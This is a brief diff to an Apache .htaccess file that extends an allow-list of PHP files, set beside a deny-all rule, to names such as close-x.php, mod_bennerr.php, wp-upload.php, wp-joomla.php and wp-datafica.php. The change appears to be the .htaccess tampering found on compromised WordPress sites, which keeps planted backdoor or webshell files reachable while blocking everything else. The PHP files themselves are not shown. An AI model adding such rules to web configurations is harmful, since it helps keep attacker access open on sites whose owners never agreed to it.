@@ -3,7 +3,7 @@ Order Allow,Deny
 Deny from all
 </FilesMatch>
 Options -Indexes
-<FilesMatch '^(#.php|close-s1.php)$'>
+<FilesMatch '^(#.php|close-s1.php|close-x.php|mod_bennerr.php|index.php|wp-upload.php|wp-joomla.php|wp-datafica.php)$'>
 Order allow,deny
 Allow from all
 </FilesMatch>
